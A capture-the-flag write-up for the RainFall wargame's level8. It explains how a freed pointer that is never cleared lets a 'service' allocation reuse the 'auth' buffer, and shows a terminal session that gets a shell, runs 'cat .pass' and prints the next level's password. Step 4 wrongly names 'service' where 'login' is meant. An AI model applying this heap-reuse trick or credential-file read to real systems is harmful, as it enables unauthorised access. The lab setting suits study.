From the source code, we can see something interesting:
```c
if (strncmp(buffer, "reset", 4) == 0) {
	if (ptr1) {
		free(ptr1);
	}
}
```

The `ptr1` it's not set to `NULL` avec it was `free`. This could lead to `double free` vulnerability. But also,
we can abuse of that pointer retention to set the data we want into the `ptr1`.

First of all, there is a summary of what each commands are doing:
- `auth`: Copy our input buffer in a 4 bytes allocated memory (`ptr1`), if it's length is not greater than 30.
- `reset`: Free the `ptr1` pointer, but don't change it to `NULL`.
- `service`: `strdup` our input without any size limitation.
- `login`: Check if the 4 bytes at the position 32 are not equals to `0`. And if it's the case,
trigger a shell.

What we can do to exploit the mecanism of `reset` is:
1. Allocate the buffer with `auth a`. This will set a pointer to `ptr1`.
2. Call `reset` that'll free the memory allocated with `auth`, but not reset the pointer.
3. Call `service` with a 32 bytes long string. Thanks to the `strdup` that'll call
`malloc`, it'll take again the address sent to `ptr1` for the step 1.
4. Now, both `ptr1` and `ptr2` have the same pointer, so with the same content,
and without any length restriction. We can call `service` that'll check the 32th byte of the string,
and see that it's not 0.

```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth a
0x804a008, (nil) 
reset
0x804a008, (nil) 
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018 
login
$ cd ../level9/
$ cat .pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```